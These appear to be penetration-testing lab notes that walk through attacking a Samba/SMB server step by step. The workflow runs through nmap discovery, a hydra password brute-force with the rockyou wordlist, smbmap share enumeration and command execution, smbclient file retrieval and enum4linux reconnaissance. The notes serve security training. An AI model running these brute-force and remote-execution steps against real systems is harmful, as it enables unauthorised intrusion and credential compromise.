
# Exploiting Samba â€“ Full Workflow

## ğŸ” What Is Samba?

- **Samba** = Linux/Unix implementation of **SMB/CIFS** protocol  
- Allows **Windows â†” Linux** file/printer sharing  
- Uses ports:  
  - `445/TCP` (modern SMB)  
  - `139/TCP` (legacy NetBIOS over SMB)

> âš ï¸ **Linux systems donâ€™t run Samba by default** â€” only if explicitly installed.

---
## Step 1: Discover Samba Service

```bash
nmap -sV -p 139,445 192.168.1.10
```
â†’ Output: `Samba smbd 3.X`

> ğŸ’¡ Always scan **both ports** â€” some systems only expose one.

---
## Step 2: Brute-Force Credentials

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10
```

- `-l` (lowercase): single username (`admin`)  
- `-P`: password wordlist  
- Protocol: `smb`

âœ… Success: `[445][smb] host: 192.168.1.10   login: admin   password: password1`

---
## Step 3: Enumerate Shares

### Tool: `smbmap`
- **Purpose**: Enumerate shares, permissions, and **execute commands** (if admin)
```bash
smbmap -H 192.168.1.10 -u admin -p password1
```
âœ… Output:
```
Disk        Permissions
----        -----------
Public      READ ONLY
Data        READ, WRITE
IPC$        NO ACCESS
```

> ğŸ’¡ If you have **admin rights**, add `-r` to list files or `-x 'command'` to execute.

---
## Step 4: Access Shares with `smbclient`

### What Is `smbclient`?

- **Built-in Samba tool** (like FTP for SMB)
- **Not a shell** â€” interactive file browser for SMB shares
- Works against **both Linux (Samba) and Windows (SMB)**

### List Shares

```bash
smbclient -L //192.168.1.10 -U admin
# Enter password when prompted
```

### Connect to a Share

```bash
smbclient //192.168.1.10/Data -U admin
smb: \> dir
smb: \> cd docs
smb: \> get flag.tar.gz
smb: \> exit
```

### Extract Downloaded File

```bash
tar xzf flag.tar.gz
```

---
## â“ FAQ

### Q: Is `smbclient` only for Linux Samba?
**No.** It works against **any SMB server** â€” including **Windows**.

### Q: Can I get a shell with `smbclient`?
**No.** Itâ€™s a **file transfer tool**, not a command shell.  
â†’ For remote execution, use:
- `smbmap -x 'whoami'` (if admin)
- `psexec.py` (via Impacket)

---

## Other Tool : `enum4linux`

A powerful all-in-one SMB enumeration tool:
### Basic Scan (Null Session)
```bash
enum4linux -a 192.168.1.10
```
â†’ Shows OS, workgroup, users, shares, password policy â€” **if null sessions allowed**

### Authenticated Enumeration
```bash
enum4linux -a -u admin -p password1 192.168.1.10
```
â†’ Reveals:
- User & machine lists  
- Group memberships  
- Share permissions  
- Domain info  
- Password complexity policy  

> ğŸ’¡ Use `enum4linux` early â€” it gives the **biggest bang for your buck** in SMB recon.

